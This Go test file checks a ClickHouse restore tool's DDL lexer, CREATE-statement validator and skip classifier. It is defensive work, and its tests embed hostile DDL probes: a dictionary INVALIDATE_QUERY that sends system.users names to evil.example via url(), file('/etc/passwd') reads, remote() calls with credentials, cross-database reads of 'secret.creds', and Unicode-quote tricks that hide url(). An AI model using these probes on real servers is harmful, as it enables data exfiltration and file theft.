package clickhouse

import (
	"strings"
	"testing"
)

func TestLexSQL(t *testing.T) {
	toks, err := lexSQL("CREATE TABLE `a``b`.\"c\\\"d\" -- c;\n /* x /* y */ ; */ ('it''s;', 'x\\'y', $tag$ ; $tag$, 1e-5) # z;\n;")
	if err != nil {
		t.Fatal(err)
	}
	var got []string
	for _, tk := range toks {
		got = append(got, tk.val)
	}
	want := []string{"CREATE", "TABLE", "a`b", ".", `c"d`, "(", "it's;", ",", "x'y", ",", " ; ", ",", "1e-5", ")", ";"}
	if strings.Join(got, "|") != strings.Join(want, "|") {
		t.Fatalf("tokens:\n got %q\nwant %q", got, want)
	}
	for _, bad := range []string{"SELECT 'open", "SELECT `open", "SELECT /* open", "SELECT $a$ open", "SELECT \x01", "SELECT ‘x’", "SELECT\u00a01"} {
		if _, err := lexSQL(bad); err == nil {
			t.Errorf("%q: expected a lexer error", bad)
		}
	}
}

func TestCheckCreate(t *testing.T) {
	ok := []struct {
		stmt, kind, db, name string
	}{
		{"CREATE TABLE shop.events\n(\n    `d` Date\n)\nENGINE = MergeTree\nORDER BY d;\n", KindTable, "shop", "events"},
		{"CREATE TABLE shop.`we/ird name` (`v` String) ENGINE = Memory", KindTable, "shop", "we/ird name"},
		{"CREATE VIEW shop.v (`x` UInt8) AS SELECT 1 AS x", KindView, "shop", "v"},
		{"CREATE MATERIALIZED VIEW shop.mv TO shop.t (`d` Date) AS SELECT d FROM shop.e", KindMaterializedView, "shop", "mv"},
		{"CREATE DICTIONARY shop.d (`id` UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(DB 'shop' TABLE 'users')) LIFETIME(0) LAYOUT(FLAT())", KindDictionary, "shop", "d"},
		{"CREATE DATABASE shop\nENGINE = Atomic", "database", "shop", ""},
		{"CREATE TABLE \"shop\".\"t\" (x UInt8) ENGINE = Log", KindTable, "shop", "t"},
	}
	for _, c := range ok {
		if _, err := checkCreate(c.stmt, c.kind, c.db, c.name); err != nil {
			t.Errorf("%q: %v", c.stmt, err)
		}
	}
	bad := []struct {
		stmt, kind, db, name, why string
	}{
		{"CREATE TABLE shop.t (x UInt8) ENGINE = Log; DROP DATABASE other", KindTable, "shop", "t", "one statement"},
		{"CREATE TABLE shop.t (x UInt8) ENGINE = Log;;", KindTable, "shop", "t", "one statement"},
		{"DROP TABLE shop.t", KindTable, "shop", "t", "not a CREATE"},
		{"CREATE TABLE other.t (x UInt8) ENGINE = Log", KindTable, "shop", "t", "creates other.t"},
		{"CREATE TABLE shop.u (x UInt8) ENGINE = Log", KindTable, "shop", "t", "creates shop.u"},
		{"CREATE TABLE t (x UInt8) ENGINE = Log", KindTable, "shop", "t", "database"},
		{"CREATE VIEW shop.t AS SELECT 1", KindTable, "shop", "t", "a view"},
		{"CREATE OR REPLACE TABLE shop.t (x UInt8) ENGINE = Log", KindTable, "shop", "t", "OR REPLACE"},
		{"CREATE TABLE IF NOT EXISTS shop.t (x UInt8) ENGINE = Log", KindTable, "shop", "t", "IF NOT EXISTS"},
		{"CREATE TEMPORARY TABLE shop.t (x UInt8) ENGINE = Log", KindTable, "shop", "t", "TEMPORARY"},
		{"CREATE TABLE shop.t ON CLUSTER c (x UInt8) ENGINE = Log", KindTable, "shop", "t", "ON CLUSTER"},
		{"CREATE DATABASE other ENGINE = Atomic", "database", "shop", "", "creates database other"},
		{"CREATE DATABASE shop ON CLUSTER c", "database", "shop", "", "ON CLUSTER"},
		{"ATTACH TABLE shop.t (x UInt8) ENGINE = Log", KindTable, "shop", "t", "not a CREATE"},
	}
	for _, c := range bad {
		_, err := checkCreate(c.stmt, c.kind, c.db, c.name)
		if err == nil || !strings.Contains(err.Error(), c.why) {
			t.Errorf("%q: want error with %q, got %v", c.stmt, c.why, err)
		}
	}
}

func TestCheckCreateDropsUUID(t *testing.T) {
	st, err := checkCreate("CREATE TABLE shop.t UUID '6b2b0f4b-0d36-4bd4-9a0e-7d3b1e5c2f10' (x UInt8) ENGINE = Log", KindTable, "shop", "t")
	if err != nil {
		t.Fatal(err)
	}
	if got := st.sql(); got != "CREATE TABLE shop.t (x UInt8) ENGINE = Log" {
		t.Fatalf("sql: %q", got)
	}
	st, err = checkCreate("CREATE MATERIALIZED VIEW shop.mv TO INNER UUID '6b2b0f4b-0d36-4bd4-9a0e-7d3b1e5c2f10' (x UInt8) ENGINE = Log AS SELECT 1 AS x", KindMaterializedView, "shop", "mv")
	if err != nil {
		t.Fatal(err)
	}
	if got := st.sql(); strings.Contains(got, "UUID") || strings.Contains(got, "INNER") {
		t.Fatalf("sql: %q", got)
	}
}

func TestRewriteReplicatedPath(t *testing.T) {
	const id = "0f6c1d9e-5d1a-4a53-8e0b-7a1f3c2b9d44"
	cases := []struct{ in, want string }{
		{"CREATE TABLE shop.r (`x` UInt64) ENGINE = ReplicatedMergeTree('/clickhouse/tables/{uuid}/{shard}', '{replica}') ORDER BY x",
			"CREATE TABLE shop.r (`x` UInt64) ENGINE = ReplicatedMergeTree('/olympos-restore/" + id + "/clickhouse/tables/{uuid}/{shard}', '{replica}') ORDER BY x"},
		{"CREATE TABLE shop.r (x UInt64, v UInt8) ENGINE = ReplicatedReplacingMergeTree('rel/it\\'s', 'r1', v) ORDER BY x",
			"CREATE TABLE shop.r (x UInt64, v UInt8) ENGINE = ReplicatedReplacingMergeTree('/olympos-restore/" + id + "/rel/it\\'s', 'r1', v) ORDER BY x"},
		{"CREATE TABLE shop.r (x UInt64) ENGINE = ReplicatedMergeTree('aux:/p/x', 'r') ORDER BY x",
			"CREATE TABLE shop.r (x UInt64) ENGINE = ReplicatedMergeTree('aux:/olympos-restore/" + id + "/p/x', 'r') ORDER BY x"},
		// No path: one is set, with the default replica name.
		{"CREATE TABLE shop.r (x UInt64, s Int8) ENGINE = ReplicatedCollapsingMergeTree(s) ORDER BY x",
			"CREATE TABLE shop.r (x UInt64, s Int8) ENGINE = ReplicatedCollapsingMergeTree('/olympos-restore/" + id + "/clickhouse/tables/{uuid}/{shard}', '{replica}', s) ORDER BY x"},
		{"CREATE TABLE shop.r (x UInt64) ENGINE = ReplicatedMergeTree ORDER BY x",
			"CREATE TABLE shop.r (x UInt64) ENGINE = ReplicatedMergeTree('/olympos-restore/" + id + "/clickhouse/tables/{uuid}/{shard}', '{replica}') ORDER BY x"},
		// A materialized view's inner engine.
		{"CREATE MATERIALIZED VIEW shop.mv (`d` Date) ENGINE = ReplicatedSummingMergeTree('/ch/mv', '{replica}') ORDER BY d AS SELECT d FROM shop.e",
			"CREATE MATERIALIZED VIEW shop.mv (`d` Date) ENGINE = ReplicatedSummingMergeTree('/olympos-restore/" + id + "/ch/mv', '{replica}') ORDER BY d AS SELECT d FROM shop.e"},
	}
	for _, c := range cases {
		got, ok := rewriteReplicatedPath(c.in, id)
		if !ok || got != c.want {
			t.Errorf("rewrite(%q):\n got %q %v\nwant %q", c.in, got, ok, c.want)
		}
	}
	for _, in := range []string{
		"CREATE TABLE shop.t (x UInt64) ENGINE = MergeTree ORDER BY x",
		"CREATE TABLE shop.t (`ReplicatedMergeTree('/a', 'b')` UInt8) ENGINE = Log",
		"CREATE VIEW shop.v AS SELECT 'ENGINE = ReplicatedMergeTree(''/a'', ''b'')' AS x",
	} {
		if got, ok := rewriteReplicatedPath(in, id); ok || got != in {
			t.Errorf("rewrite(%q) = %q %v, want unchanged", in, got, ok)
		}
	}
}

func TestClassify(t *testing.T) {
	restored := map[string]bool{"shop": true, "billing": true}
	tbl := func(name, engine string) Table { return Table{Name: name, Kind: KindTable, Engine: engine} }
	cases := []struct {
		t      Table
		ddl    string
		create bool
		why    string // in the skip reason
	}{
		{tbl("e", "MergeTree"), "CREATE TABLE shop.e (x UInt8) ENGINE = MergeTree ORDER BY x", true, ""},
		{tbl("l", "TinyLog"), "CREATE TABLE shop.l (x UInt8) ENGINE = TinyLog", true, ""},
		{tbl("n", "Null"), "CREATE TABLE shop.n (x UInt8) ENGINE = Null", true, ""},
		{tbl("m", "Merge"), "CREATE TABLE shop.m (x UInt8) ENGINE = Merge('shop', '^e$')", true, ""},
		{tbl("m2", "Merge"), "CREATE TABLE shop.m2 (x UInt8) ENGINE = Merge(other, '^e$')", false, "database other"},
		{tbl("m3", "Merge"), "CREATE TABLE shop.m3 (x UInt8) ENGINE = Merge(REGEXP('^s'), '^e$')", false, "pattern"},
		{tbl("b", "Buffer"), "CREATE TABLE shop.b (x UInt8) ENGINE = Buffer(billing, e, 1, 10, 100, 1, 10, 1, 10)", true, ""},
		{tbl("b2", "Buffer"), "CREATE TABLE shop.b2 (x UInt8) ENGINE = Buffer('other', 'e', 1, 10, 100, 1, 10, 1, 10)", false, "database other"},
		{tbl("k", "Kafka"), "CREATE TABLE shop.k (x String) ENGINE = Kafka SETTINGS kafka_broker_list = 'b:9092'", false, "Kafka"},
		{tbl("s", "S3"), "CREATE TABLE shop.s (x String) ENGINE = S3('https://bucket/x', 'KEY', 'SECRET', 'CSV')", false, "S3"},
		{tbl("d", "Distributed"), "CREATE TABLE shop.d (x String) ENGINE = Distributed('c', 'shop', 'e')", false, "cluster"},
		{tbl("p", "PostgreSQL"), "CREATE TABLE shop.p (x String) ENGINE = PostgreSQL('h:5432', 'db', 't', 'u', 'pw')", false, "PostgreSQL"},
		{tbl("x", "SomethingNew"), "CREATE TABLE shop.x (x String) ENGINE = SomethingNew", false, "SomethingNew"},
		{tbl("w", "MergeTree"), "CREATE TABLE shop.w (x String) ENGINE = MergeTree ORDER BY x SETTINGS disk = disk(type = s3, endpoint = 'https://b/')", false, "disk"},
		{tbl("f", "MergeTree"), "CREATE TABLE shop.f (x String DEFAULT file('/etc/passwd')) ENGINE = MergeTree ORDER BY x", false, "file"},
		{tbl("tf", "URL"), "CREATE TABLE shop.tf AS url('http://x/', 'CSV', 'a String')", false, "URL"},
		{tbl("e2", "Log"), "CREATE TABLE shop.e2 (x UInt8) ENGINE = MergeTree ORDER BY x", false, "engine MergeTree, the backup recorded Log"},
		// Views.
		{Table{Name: "v", Kind: KindView}, "CREATE VIEW shop.v (x UInt8) AS SELECT x FROM billing.t", true, ""},
		{Table{Name: "v1", Kind: KindView}, "CREATE VIEW shop.v1 (x UInt8) AS SELECT x FROM other.t", false, "reads other.t"},
		{Table{Name: "v2", Kind: KindView}, "CREATE VIEW shop.v2 (x String) AS SELECT * FROM s3('https://b/x.csv')", false, "s3"},
		{Table{Name: "v3", Kind: KindView}, "CREATE VIEW shop.v3 (x String) AS SELECT * FROM remote('h:9000', db.t, 'u', 'pw')", false, "remote"},
		// Materialized views.
		{Table{Name: "mv", Kind: KindMaterializedView, Engine: "MaterializedView"}, "CREATE MATERIALIZED VIEW shop.mv (d Date) ENGINE = SummingMergeTree ORDER BY d AS SELECT d FROM shop.e", true, ""},
		{Table{Name: "mv2", Kind: KindMaterializedView, Engine: "MaterializedView"}, "CREATE MATERIALIZED VIEW shop.mv2 TO billing.t (d Date) AS SELECT d FROM shop.e", true, ""},
		{Table{Name: "mv3", Kind: KindMaterializedView, Engine: "MaterializedView"}, "CREATE MATERIALIZED VIEW shop.mv3 TO other.t (d Date) AS SELECT d FROM shop.e", false, "writes into other.t"},
		{Table{Name: "mv4", Kind: KindMaterializedView, Engine: "MaterializedView"}, "CREATE MATERIALIZED VIEW shop.mv4 TO shop.t (d Date) AS SELECT d FROM other.e", false, "reads other.e"},
		{Table{Name: "mv5", Kind: KindMaterializedView, Engine: "MaterializedView"}, "CREATE MATERIALIZED VIEW shop.mv5 (d Date) ENGINE = Kafka AS SELECT d FROM shop.e", false, "Kafka"},
		// Dictionaries.
		{Table{Name: "dc", Kind: KindDictionary}, "CREATE DICTIONARY shop.dc (id UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(DB 'billing' TABLE 'users' USER 'u' PASSWORD '[HIDDEN]')) LIFETIME(0) LAYOUT(FLAT())", true, ""},
		{Table{Name: "dc2", Kind: KindDictionary}, "CREATE DICTIONARY shop.dc2 (id UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(HOST 'ch.other' PORT 9000 DB 'shop' TABLE 'users')) LIFETIME(0) LAYOUT(FLAT())", false, "host"},
		{Table{Name: "dc3", Kind: KindDictionary}, "CREATE DICTIONARY shop.dc3 (id UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(DB 'other' TABLE 'users')) LIFETIME(0) LAYOUT(FLAT())", false, "database other"},
		{Table{Name: "dc4", Kind: KindDictionary}, "CREATE DICTIONARY shop.dc4 (id UInt64) PRIMARY KEY id SOURCE(MYSQL(HOST 'h' DB 'd' TABLE 't' USER 'u' PASSWORD 'p')) LIFETIME(0) LAYOUT(FLAT())", false, "MYSQL"},
		{Table{Name: "dc5", Kind: KindDictionary}, "CREATE DICTIONARY shop.dc5 (id UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(QUERY 'SELECT * FROM other.t')) LIFETIME(0) LAYOUT(FLAT())", false, "QUERY"},
		{Table{Name: "dc6", Kind: KindDictionary}, "CREATE DICTIONARY shop.dc6 (id UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(HOST 'localhost' DB 'shop' TABLE 'users')) LIFETIME(0) LAYOUT(FLAT())", true, ""},
		{Table{Name: "lv", Kind: KindOther, Engine: "LiveView"}, "CREATE LIVE VIEW shop.lv AS SELECT 1", false, "LiveView"},
	}
	for _, c := range cases {
		o, err := classify("shop", c.t, c.ddl, restored)
		if err != nil {
			if c.why != "" && strings.Contains(err.Error(), c.why) && !c.create {
				continue
			}
			t.Errorf("%s: %v", c.t.Name, err)
			continue
		}
		if o.create != c.create || (c.why != "" && !strings.Contains(o.reason, c.why)) {
			t.Errorf("%s: create=%v reason=%q, want create=%v reason with %q", c.t.Name, o.create, o.reason, c.create, c.why)
		}
		if !o.create && (strings.Contains(o.reason, "SECRET") || strings.Contains(o.reason, "pw") || strings.Contains(o.reason, "https://")) {
			t.Errorf("%s: reason carries DDL: %q", c.t.Name, o.reason)
		}
	}
}

func TestScanRefs(t *testing.T) {
	cases := []struct{ stmt, refs, why string }{
		{"CREATE MATERIALIZED VIEW shop.mv TO shop.t (d Date) AS SELECT d FROM shop.k AS k JOIN `billing`.u ON k.x = u.x LEFT JOIN e USING (d)",
			"shop.k,billing.u,shop.e", ""},
		// Comma joins, subqueries, IN, CTEs, string-named objects.
		{"CREATE VIEW shop.v AS WITH c AS (SELECT 1 AS x) SELECT s.x FROM shop.src AS e, secret.creds AS s, c " +
			"WHERE e.x IN (SELECT x FROM other.t) AND e.y IN billing.ids AND e.z IN tuple(1, 2) AND dictGet('d2', 'v', e.x) = '' " +
			"AND joinGet('billing.j', 'v', e.x) = 1",
			"shop.src,secret.creds,other.t,billing.ids,shop.d2,billing.j", ""},
		{"CREATE VIEW shop.v AS SELECT extract(DAY FROM d) AS a, trim(BOTH ' ' FROM s) AS b FROM shop.t ARRAY JOIN arr AS x, t.arr2 AS y",
			"shop.t", ""},
		{"CREATE VIEW shop.v AS SELECT * FROM numbers(10) UNION ALL SELECT * FROM merge('billing', '^t') UNION ALL SELECT * FROM loop(shop, t)",
			"billing.*,shop.*", ""},
		{"CREATE VIEW shop.v AS SELECT * FROM view(SELECT * FROM other.t)", "other.t", ""},
		{"CREATE TABLE shop.t (`k` String DEFAULT (SELECT any(x) FROM other.t)) ENGINE = MergeTree ORDER BY k", "other.t", ""},
		// Fail closed.
		{"CREATE VIEW shop.v AS SELECT * FROM url('http://e/', 'CSV', 'x String')", "", "table function url()"},
		{"CREATE VIEW shop.v AS SELECT * FROM `url`('http://e/', 'CSV', 'x String')", "", "table function url()"},
		{"CREATE VIEW shop.v AS SELECT * FROM url ('http://e/', 'CSV', 'x String')", "", "table function url()"},
		{"CREATE VIEW shop.v AS SELECT * FROM mergeTreeIndex(shop, t)", "", "table function mergeTreeIndex()"},
		{"CREATE VIEW shop.v AS SELECT * FROM merge(REGEXP('.*'), '.*')", "", "pattern"},
		{"CREATE VIEW shop.v AS SELECT * FROM shop.t WHERE x IN url('http://e/', 'CSV', 'x String')", "", "url()"},
		{"CREATE VIEW shop.v AS SELECT dictGet(concat('se', 'cret.d'), 'v', 1) AS x", "", "dictGet() with an object name"},
		{"CREATE VIEW shop.v AS SELECT file('/etc/passwd') AS x", "", "file()"},
		{"CREATE VIEW shop.v AS SELECT * FROM a.b.c", "", "cannot read"},
		{"CREATE TABLE shop.t (`k` String DEFAULT (SELECT any(x) FROM paimonS3('http://e/', 'k', 's'))) ENGINE = MergeTree ORDER BY k", "", "paimonS3"},
	}
	for _, c := range cases {
		kind := KindView
		name := "v"
		switch {
		case strings.HasPrefix(c.stmt, "CREATE MATERIALIZED"):
			kind, name = KindMaterializedView, "mv"
		case strings.HasPrefix(c.stmt, "CREATE TABLE"):
			kind, name = KindTable, "t"
		}
		st, err := checkCreate(c.stmt, kind, "shop", name)
		if err != nil {
			t.Fatalf("%q: %v", c.stmt, err)
		}
		refs, why := st.scanRefs("shop")
		if c.why != "" {
			if !strings.Contains(why, c.why) {
				t.Errorf("%q: why %q, want %q", c.stmt, why, c.why)
			}
			continue
		}
		if why != "" || strings.Join(refs, ",") != c.refs {
			t.Errorf("%q:\n refs %q why %q\nwant %q", c.stmt, strings.Join(refs, ","), why, c.refs)
		}
	}
	st, _ := checkCreate("CREATE MATERIALIZED VIEW shop.mv TO shop.t (d Date) AS SELECT d FROM shop.k", KindMaterializedView, "shop", "mv")
	if db, name, ok := st.mvTarget("shop"); !ok || db != "shop" || name != "t" {
		t.Fatalf("target: %s %s %v", db, name, ok)
	}
}

// TestReviewProbes are the review's probes (ClickHouse 24.8 confirmed each
// bypass): none of them is created.
func TestReviewProbes(t *testing.T) {
	restored := map[string]bool{"shop": true}
	cases := []struct{ name, kind, engine, ddl, why string }{
		{"dict INVALIDATE_QUERY url", KindDictionary, "", "CREATE DICTIONARY shop.d (`id` UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(DB 'shop' TABLE 'users' INVALIDATE_QUERY 'SELECT count() FROM url(''http://evil.example/?'' || (SELECT groupArray(name) FROM system.users)::String, CSV, ''a String'')')) LIFETIME(10) LAYOUT(FLAT())", "INVALIDATE_QUERY"},
		{"dict WHERE remote", KindDictionary, "", "CREATE DICTIONARY shop.d (`id` UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(DB 'shop' TABLE 'users' WHERE 'id IN (SELECT 1 FROM remote(''source-ch:9000'', system.one))')) LIFETIME(10) LAYOUT(FLAT())", "WHERE"},
		{"dict UPDATE_FIELD", KindDictionary, "", "CREATE DICTIONARY shop.d (`id` UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(DB 'shop' TABLE 'users' UPDATE_FIELD 'x')) LIFETIME(10) LAYOUT(FLAT())", "UPDATE_FIELD"},
		{"dict duplicate HOST", KindDictionary, "", "CREATE DICTIONARY shop.d (`id` UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(HOST 'source-ch.prod.svc' PORT 9000 USER 'u' PASSWORD '[HIDDEN]' DB 'shop' TABLE 'users' HOST 'localhost')) LIFETIME(10) LAYOUT(FLAT())", "twice"},
		{"dict duplicate DB", KindDictionary, "", "CREATE DICTIONARY shop.d (`id` UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(DB 'secret' TABLE 'users' DB 'shop')) LIFETIME(10) LAYOUT(FLAT())", "twice"},
		{"dict duplicate LIFETIME key", KindDictionary, "", "CREATE DICTIONARY shop.d (`id` UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(DB 'shop' TABLE 'users')) LIFETIME(MIN 0 MIN 5) LAYOUT(FLAT())", "repeats MIN"},
		{"dict duplicate LAYOUT key", KindDictionary, "", "CREATE DICTIONARY shop.d (`id` UInt64) PRIMARY KEY id SOURCE(CLICKHOUSE(DB 'shop' TABLE 'users')) LIFETIME(0) LAYOUT(HASHED(SHARDS 2 SHARDS 4))", "repeats SHARDS"},
		{"dict expression reads other db", KindDictionary, "", "CREATE DICTIONARY shop.d (`id` UInt64, `v` String EXPRESSION dictGet('secret.d', 'v', id)) PRIMARY KEY id SOURCE(CLICKHOUSE(DB 'shop' TABLE 'users')) LIFETIME(0) LAYOUT(FLAT())", "secret.d"},
		{"view unicode-quote hides url()", KindView, "", "CREATE VIEW shop.v AS SELECT ‘'’ AS a, x FROM url('http://e/', 'CSV', 'x String') -- '", "outside ASCII"},
		{"view NBSP between url and (", KindView, "", "CREATE VIEW shop.v AS SELECT * FROM url\u00a0('http://e/', 'CSV', 'x String')", "outside ASCII"},
		{"view backquoted table function", KindView, "", "CREATE VIEW shop.v AS SELECT * FROM `url`('http://e/', 'CSV', 'x String')", "url()"},
		{"MV comma join other db", KindMaterializedView, "", "CREATE MATERIALIZED VIEW shop.mv TO shop.t (`x` String) DEFINER = default SQL SECURITY DEFINER AS SELECT s.x FROM shop.src AS e, secret.creds AS s", "secret.creds"},
		{"MV merge() all dbs", KindMaterializedView, "", "CREATE MATERIALIZED VIEW shop.mv TO shop.t (`x` String) AS SELECT x FROM shop.src WHERE x IN (SELECT x FROM merge(REGEXP('.*'), '.*'))", "pattern"},
		{"MV joinGet other db", KindMaterializedView, "", "CREATE MATERIALIZED VIEW shop.mv TO shop.t (`x` String) AS SELECT joinGet('secret.j', 'v', x) AS x FROM shop.src", "secret.j"},
		{"view DEFINER reads other db", KindView, "", "CREATE VIEW shop.v (`x` String) DEFINER = default SQL SECURITY DEFINER AS SELECT x FROM secret.creds", "secret.creds"},
		{"table EmbeddedRocksDB dir", KindTable, "EmbeddedRocksDB", "CREATE TABLE shop.t (`k` String, `v` String) ENGINE = EmbeddedRocksDB(0, '/var/lib/clickhouse/store/abc/other_rocksdb', 1) PRIMARY KEY k", "path"},
		{"table setting path", KindTable, "MergeTree", "CREATE TABLE shop.t (`k` String) ENGINE = MergeTree ORDER BY k SETTINGS storage_policy = '/x'", "path"},
		{"table paimonS3 default", KindTable, "MergeTree", "CREATE TABLE shop.t (`k` String DEFAULT (SELECT any(x) FROM paimonS3('http://e/', 'k', 's'))) ENGINE = MergeTree ORDER BY k", "paimonS3"},
		{"MV refreshable", KindMaterializedView, "", "CREATE MATERIALIZED VIEW shop.mv REFRESH EVERY 1 HOUR TO shop.t (`x` String) AS SELECT x FROM shop.src", "refreshable"},
	}
	for _, c := range cases {
		ddl := c.ddl
		name := map[string]string{KindDictionary: "d", KindView: "v", KindMaterializedView: "mv", KindTable: "t"}[c.kind]
		cl, err := classify("shop", Table{Name: name, Kind: c.kind, Engine: c.engine}, ddl, restored)
		if err != nil {
			t.Errorf("%s: %v", c.name, err)
			continue
		}
		if cl.create || !strings.Contains(cl.reason, c.why) {
			t.Errorf("%s: create=%v reason=%q, want a skip with %q", c.name, cl.create, cl.reason, c.why)
		}
		if strings.Contains(cl.reason, "http") || strings.Contains(cl.reason, "source-ch") {
			t.Errorf("%s: reason carries DDL: %q", c.name, cl.reason)
		}
	}
	// POPULATE is refused outright (SHOW CREATE never writes it).
	if _, err := classify("shop", Table{Name: "mv", Kind: KindMaterializedView}, "CREATE MATERIALIZED VIEW shop.mv ENGINE = MergeTree ORDER BY x POPULATE AS SELECT x FROM shop.src", restored); err == nil || !strings.Contains(err.Error(), "POPULATE") {
		t.Errorf("POPULATE: %v", err)
	}
}
